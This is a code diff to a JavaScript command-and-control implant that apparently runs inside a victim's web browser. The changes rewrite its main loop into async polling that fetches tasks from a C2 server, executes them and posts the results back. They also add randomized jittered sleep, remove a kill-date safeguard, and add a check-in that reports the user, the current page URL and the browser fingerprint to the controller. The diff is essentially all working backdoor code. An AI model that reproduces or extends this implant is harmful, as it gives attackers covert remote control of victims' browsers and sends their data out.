@@ -1,4 +1,4 @@
-get_browser = function(){
+function get_browser() {
     var nVer = navigator.appVersion;
     var nAgt = navigator.userAgent;
     var browserName  = navigator.appName;
@@ -58,9 +58,6 @@ get_tab_id = function(){
             sessionStorage.tabID : 
             sessionStorage.tabID = Math.random();
             sessionStorage.closedLastTab = '2';
-    $(window).on('unload beforeunload', function() {
-      sessionStorage.closedLastTab = '1';
-    });
     return tabID;
 }
 
@@ -141,11 +138,11 @@ var jsimport = "";
 let ip_found = false;
 C2.commands =  Object.keys(commands_dict);
 //---------------------------MAIN LOOP ----------------------------------------
-function sleepWakeUp(){
+async function sleepWakeUp(interval, jitter){
     while(true){
-        $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());
         let output = "";
-        let task = C2.getTasking();
+        let task = await C2.getTasking();
+	if (task != null){
         //console.log(JSON.stringify(task));
         let command = "";
         try{
@@ -172,8 +169,22 @@ function sleepWakeUp(){
         catch(error){
             C2.postResponse(task, {"user_output": error.toString(), "status": "error", "completed": true});
         }
+}else{await new Promise(r => setTimeout(r, this.gen_sleep_time(interval, jitter)));}
     }
 }
-if( C2.kill_date > new Date()){
-    sleepWakeUp();
-  }
+
+function gen_sleep_time(interval, jitter){
+      //generate a time that's this.interval += (interval * 1/jitter)
+      if(jitter < 1){return interval;}
+      let plus_min = this.get_random_int(1);
+      if(plus_min === 1){
+          return (interval + (interval * (this.get_random_int(jitter)/100)))*1000;
+      }else{
+          return (interval - (interval * (this.get_random_int(jitter)/100)))*1000;
+      }
+    }
+function get_random_int(max) {
+    return Math.floor(Math.random() * Math.floor(max + 1));
+}
+C2.checkin("127.0.0.1",0,bowser.user,window.location['href'],"N/A", "N/A", get_browser());
+sleepWakeUp(C2.interval, C2.jitter);
